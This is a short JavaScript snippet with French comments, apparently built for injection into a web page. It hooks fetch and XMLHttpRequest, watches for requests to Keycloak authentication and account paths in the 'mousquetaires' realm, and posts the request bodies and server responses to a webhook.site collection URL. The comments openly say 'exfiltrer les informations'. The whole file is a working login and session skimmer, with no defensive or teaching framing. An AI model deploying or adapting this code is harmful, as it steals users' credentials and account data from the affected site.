(function() {
  // Endpoint de collecte (ton serveur)
  const hookEndpoint = "https://webhook.site/a3d6d9f6-4141-47bd-a203-441b22ec5126";

  // ---------------------------
  // Interception de fetch
  // ---------------------------
  const originalFetch = window.fetch;
  window.fetch = async function(input, init) {
    let url = "";
    if (typeof input === "string") {
      url = input;
    } else if (input && input.url) {
      url = input.url;
    }
    
    // Vérifie si l'URL correspond à l'une des deux cibles
    if (
      url.includes("/auth/realms/mousquetaires/account") ||
      url.includes("/auth/realms/mousquetaires/login-actions/authenticate")
    ) {
      // Exfiltrer les informations vers ton serveur
      originalFetch(hookEndpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: url, init: init })
      });
    }
    
    return originalFetch(input, init);
  };

  // ---------------------------
  // Interception de XMLHttpRequest (XHR)
  // ---------------------------
  // Redéfinition de open pour mémoriser l'URL
  const originalOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    this._url = url;
    return originalOpen.apply(this, arguments);
  };

  // Redéfinition de send pour écouter la réponse
  const originalSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(body) {
    this.addEventListener("load", function() {
      if (
        this._url && (
          this._url.includes("/auth/realms/mousquetaires/account") ||
          this._url.includes("/auth/realms/mousquetaires/login-actions/authenticate")
        )
      ) {
        fetch(hookEndpoint, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url: this._url, response: this.responseText })
        });
      }
    });
    return originalSend.apply(this, arguments);
  };
})();
